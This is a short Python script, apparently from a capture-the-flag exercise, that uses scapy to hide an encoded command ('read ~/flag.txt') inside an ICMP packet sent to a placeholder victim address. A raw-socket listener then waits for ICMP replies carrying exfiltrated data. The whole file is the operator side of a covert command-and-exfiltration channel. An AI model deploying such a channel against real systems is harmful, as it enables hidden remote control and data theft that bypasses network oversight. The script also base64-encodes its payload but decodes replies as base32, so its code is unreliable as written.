import sys
from scapy.all import sr1, IP, ICMP, send, srp1
from threading import Thread
import base64
import re
import socket

def sendPayload():
  #We send define an ICMP package that also contains our command
  packet = IP(dst="<IP of the Victim>", src="<Your IP for Echo>")/ICMP()/b'{e3JlYWQgfi9mbGFnLnR4dH0=}'
  #Send it over our specific interface
  response = send(packet, iface="<Your interface>")

def rcvCallback():
  #Create socket for listening
  s = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP)
  s.setsockopt(socket.SOL_IP, socket.IP_HDRINCL, 1)
  while 1:
    #Receive incoming ICMP Packet
    data, addr = s.recvfrom(1508)
    print("Packet from %r: %r" % (addr,data))
    #Try to find a command
    command = re.findall(r'{(.*?)}',str(data))[0]
    #Replies come back base64 encoded, so that will throw an exception when we decode
    try:
      #Decode the response of the daemon
      decodedCommand = base64.b32decode(command).decode("utf-8")
      allCommands = re.findall(r'{(.*?)}',decodedCommand)
      #check our command set
      for command in allCommands:
        if "gathered" in command:
          print("YAY! We exfiltrated -> "+command.split(" ")[1])
        else:
          print("We dont know that command yet :(")
    except:
      #Echo reply 
      print("No relevant data! Maybe response")
      continue

#Start thread to listen for responses
Thread(target = rcvCallback).start()
#Start thread to send commands
Thread(target = sendPayload).start()
